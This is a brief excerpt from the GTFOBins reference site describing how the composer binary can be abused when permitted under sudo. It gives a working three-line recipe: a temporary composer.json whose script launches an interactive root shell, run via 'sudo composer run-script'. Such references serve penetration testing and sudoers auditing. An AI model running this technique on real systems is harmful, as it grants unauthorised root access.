From the url https://gtfobins.github.io/gtfobins/composer/ we got this
## Sudo[](https://gtfobins.github.io/gtfobins/composer/#sudo)

If the binary is allowed to run as superuser byÂ `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.


    TF=$(mktemp -d)
    echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
    sudo composer --working-dir=$TF run-script x
